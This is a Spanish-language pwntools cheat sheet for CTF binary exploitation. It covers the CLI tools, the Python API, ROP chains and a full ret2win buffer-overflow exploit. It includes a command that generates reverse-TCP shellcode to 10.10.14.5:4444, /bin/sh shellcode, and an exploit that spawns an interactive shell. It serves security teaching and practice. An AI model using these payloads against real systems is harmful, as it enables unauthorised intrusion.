<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Hoja de referencia de pwntools

[pwntools](https://github.com/Gallopsled/pwntools) es el mejor marco CTF y biblioteca de desarrollo de exploits escrito en Python. Diseñado para la creación rápida de prototipos, explotación binaria (pwn) e ingeniería inversa, proporciona un conjunto completo de herramientas de línea de comandos (`pwn cyclic`, `pwn checksec`, `pwn asm`, `pwn shellcraft`) junto con una API de Python de alto nivel para interactuar con procesos locales y sockets remotos.

---

## Tabla de contenido

- [Capacidades básicas] (#capacidades básicas)
- [Instalación](#instalación)
- [Utilidades de línea de comandos (`pwn <cmd>`)](#command-line-utilities-pwn-cmd)
  - [`pwn cyclic` (Cálculo de compensación de búfer)](#pwn-cálculo-de-compensación-de-búfer-cíclico)
  - [`pwn checksec` (Inspección de mitigación)](#pwn-checksec-mitigation-inspection)
  - [`pwn asm` y `pwn disasm` (ensamblador/desensamblador)](#pwn-asm--pwn-disasm-assembler--desensamblador)
  - [`pwn shellcraft` (generador de código Shell)](#pwn-shellcraft-shellcode-generator)
  - [`pwn template` (Generador de esqueletos de explotación)](#pwn-template-exploit-skeleton-generator)
- [Flujo de trabajo de desarrollo de exploits de Python](#python-exploit-development-workflow)
  - [Conexiones de proceso y sockets remotos](#proceso--conexiones-de-socket-remotos)
  - [Análisis y símbolos ELF](#elf-parsing--symbols)
  - [Construcción de cadena ROP] (#rop-chain-construction)
  - [Embalaje y endianidad (`p32` / `p64`)](#packing--endianness-p32--p64)
- [Ejemplo completo de explotación (desbordamiento de búfer + ret2win)](#complete-exploit-example-buffer-overflow--ret2win)

---

## Capacidades principales

- **Arquitectura de Tubes:** Interfaz unificada para interactuar con procesos locales (`process`), sockets TCP remotos (`remote`) y sesiones SSH (`ssh`).
- **Inspección binaria y de dispositivos:** Resolución automatizada de símbolos ELF, búsqueda GOT/PLT y síntesis de cadena ROP automatizada.
- **Ensamblaje sobre la marcha:** Traducción instantánea entre mnemónicos de ensamblaje y códigos de operación en x86, x86_64, ARM, MIPS y AArch64.
- **Síntesis de Shellcode:** Plantillas de código de shell personalizables y prediseñadas para shells inversos, execve, lectura de archivos y evasión.

---

## Instalación
```bash
# Ubuntu / Debian / Kali Linux
sudo apt-get update && sudo apt-get install -y python3-pwntools

# Via pip in an isolated Python environment
pip3 install pwntools

# Verify command-line utilities
pwn version
```
---

## Utilidades de línea de comandos (`pwn <cmd>`)

### `pwn cyclic` (Cálculo de compensación del búfer)
Genere patrones cíclicos únicos de De Bruijn para determinar la compensación exacta del fallo (sobrescritura de EIP/RIP):
```bash
# Generate a 200-byte unique pattern
pwn cyclic 200

# Find offset of crashing pattern (e.g. from crash address or register value 0x6161616c)
pwn cyclic -l 0x6161616c
# Output: 44 (offset is exactly 44 bytes to saved instruction pointer)

# 64-bit architecture cyclic pattern lookup
pwn cyclic -l "faaa" -n 8
```
### `pwn checksec` (Inspección de mitigación)
Verifique las mitigaciones de seguridad (Canary, NX, PIE, RELRO, ASLR) de cualquier ejecutable de ELF:
```bash
pwn checksec /path/to/binary
```
### `pwn asm` y `pwn disasm` (ensamblador/desensamblador)
Reúna instrucciones en bytes de shellcode directamente desde la terminal:
```bash
# Assemble x86 instructions to hex bytes
pwn asm "xor eax, eax; push eax"

# Assemble 64-bit shellcode with null-byte output format
pwn asm -c amd64 "mov rax, 59; syscall" --format hex

# Disassemble raw hex bytes back to assembly
pwn disasm "31c050682f2f7368682f62696e89e3505389e1b00bcd80" -c i386
```
### `pwn shellcraft` (Generador de código Shell)
Genere cargas útiles de shellcode listas para producción directamente en archivos binarios o estándar de terminal:
```bash
# Generate Linux x64 execve /bin/sh shellcode in hex
pwn shellcraft amd64.linux.sh --format hex

# Generate reverse TCP shellcode (IP: 10.10.14.5, Port: 4444)
pwn shellcraft amd64.linux.connect 10.10.14.5 4444

# Output pure raw bytes directly into a file
pwn shellcraft amd64.linux.sh --format raw > shellcode.bin
```
### `pwn template` (Generador de esqueletos de explotación)
Genere una plantilla de exploit Python probada en batalla para un servidor remoto y binario de destino:
```bash
pwn template ./vuln_binary --host 10.10.10.100 --port 1337 > exploit.py
```
---

## Flujo de trabajo de desarrollo de exploits de Python

### Conexiones de proceso y enchufes remotos
```python
from pwn import *

# Set target architecture and log level
context.arch = 'amd64'
context.log_level = 'debug'

# Local process execution
io = process('./vuln_binary')

# Or connect to remote CTF instance
# io = remote('10.10.10.100', 1337)

# Send and receive data
io.recvuntil(b'Enter your name: ')
io.sendline(b'Alice')

# Switch to interactive shell once exploit succeeds
io.interactive()
```
### Análisis y símbolos ELF
Lea automáticamente direcciones de funciones, tablas GOT y PLT sin búsquedas manuales de GDB:
```python
elf = ELF('./vuln_binary')
print(f"Target function address: {hex(elf.symbols['win'])}")
print(f"puts() PLT address: {hex(elf.plt['puts'])}")
print(f"puts() GOT address: {hex(elf.got['puts'])}")
```
### Construcción de cadena ROP
Cree cadenas de programación orientada al retorno (ROP) automáticamente:
```python
elf = ELF('./vuln_binary')
rop = ROP(elf)

# Call win_function(0x1337, 0xdeadbeef)
rop.win(0x1337, 0xdeadbeef)
print(rop.dump())

payload = b"A" * 40 + rop.chain()
```
### Embalaje y endianidad (`p32` / `p64`)
Convierta direcciones de memoria enteras en bytes little-endian:
```python
# 32-bit little-endian packing
address_32 = p32(0x080484b6)  # Returns b'\xb6\x84\x04\x08'

# 64-bit little-endian packing
address_64 = p64(0x0000000000401156)

# Unpacking bytes to integer
val = u64(b"\x56\x11\x40\x00\x00\x00\x00\x00")
```
---

## Ejemplo completo de explotación (desbordamiento de búfer + ret2win)
```python
#!/usr/bin/env python3
from pwn import *

# Binary configuration
binary_path = './challenge'
context.binary = binary_path
context.log_level = 'info'

elf = ELF(binary_path)

# 1. Start target process or remote connection
if args.REMOTE:
    io = remote('target.ctf.local', 9999)
else:
    io = process(binary_path)

# 2. Craft payload
offset = 40
win_address = elf.symbols['win']

# Include ret gadget for 16-byte stack alignment in Ubuntu 64-bit
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat(
    asm('nop') * offset,
    ret_gadget,
    win_address
)

# 3. Deliver payload
io.recvuntil(b'Say something: ')
io.sendline(payload)

# 4. Drop to interactive shell
log.success("Exploit sent! Enjoy your shell:")
io.interactive()
```